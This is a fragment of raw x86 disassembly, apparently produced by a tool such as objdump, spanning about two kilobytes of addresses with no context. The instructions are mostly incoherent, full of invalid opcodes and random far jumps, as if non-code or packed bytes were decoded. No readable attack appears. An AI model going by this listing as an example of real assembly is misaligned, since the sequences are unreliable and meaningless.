  41774f:	mul    bh
  417751:	test   eax,0x8006158d
  417756:	(bad)  
  417758:	call   0xe76b:0x2fa8724f
  41775f:	sbb    eax,0xb40dc
  417764:	jl     0x4177de
  417766:	cmp    BYTE PTR [edx+0x15],dh
  417769:	test   BYTE PTR [ecx],0x94
  41776c:	cmp    edx,DWORD PTR [esi-0x5]
  41776f:	sub    eax,DWORD PTR [ebx+ebx*8+0x184227b8]
  417776:	out    0x96,eax
  417778:	jmp    0x2dd8:0xfbaecf80
  41777f:	jmp    0x4177d5
  417781:	mov    ecx,0xe90b6041
  417786:	jb     0x417729
  417788:	out    dx,al
  417789:	in     al,0xf1
  41778b:	mov    esi,DWORD PTR [eax-0x27]
  41778e:	or     al,0x38
  417790:	fisttp QWORD PTR [esp+ebp*2-0x35]
  417794:	mov    bl,0xc
  417796:	xor    esi,ebp
  417798:	lds    esi,FWORD PTR [eax]
  41779a:	rcl    BYTE PTR [eax],0x69
  41779d:	jp     0x4177df
  41779f:	lock aad 0xa9
  4177a2:	pop    edx
  4177a3:	je     0x4177ac
  4177a5:	ins    BYTE PTR es:[edi],dx
  4177a6:	pusha  
  4177a7:	pop    eax
  4177a8:	ja     0x417761
  4177aa:	dec    esp
  4177ab:	(bad)  
  4177ac:	pop    ds
  4177ad:	and    esi,DWORD PTR [eax+eax*8-0x61]
  4177b1:	daa    
  4177b2:	jnp    0x41779e
  4177b4:	pushf  
  4177b5:	push   ecx
  4177b6:	aas    
  4177b7:	std    
  4177b8:	lea    edx,[ebx-0x31]
  4177bb:	add    al,0xfb
  4177bd:	inc    eax
  4177be:	das    
  4177bf:	lds    edx,FWORD PTR [ebx+0x691fef90]
  4177c5:	xchg   DWORD PTR [eax],ecx
  4177c7:	sub    DWORD PTR [esi],ecx
  4177c9:	data16 or BYTE PTR [edi+0x5e943d05],bl
  4177d0:	xchg   DWORD PTR [ebx],eax
  4177d2:	sbb    eax,0xff55dde4
  4177d7:	add    esi,DWORD PTR [edi-0x2cfa5b10]
  4177dd:	hlt    
  4177de:	div    DWORD PTR [ebx]
  4177e0:	mov    BYTE PTR [ecx-0x26],dh
  4177e3:	push   ss
  4177e4:	ficomp WORD PTR [edi-0x25]
  4177e7:	pop    edx
  4177e8:	dec    ecx
  4177e9:	push   ebp
  4177ea:	outs   dx,DWORD PTR ds:[esi]
  4177eb:	dec    esp
  4177ec:	aaa    
  4177ed:	pop    esp
  4177ee:	cmp    ch,BYTE PTR [eax-0x64f66197]
  4177f4:	pop    ecx
  4177f5:	push   0xfffffff6
  4177f7:	hlt    
  4177f8:	push   ebx
  4177f9:	inc    esi
  4177fa:	cmp    al,0xcc
  4177fc:	shl    BYTE PTR [ecx],0x1d
  4177ff:	rol    ebp,0x92
  417802:	mov    dh,0x19
  417804:	sbb    ecx,DWORD PTR [ecx+0xd]
  417807:	test   DWORD PTR [esi],esi
  417809:	popa   
  41780a:	retf   0x7452
  41780d:	into   
  41780e:	mov    ecx,0xd3f7b165
  417813:	or     dl,BYTE PTR [edi]
  417815:	pop    esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
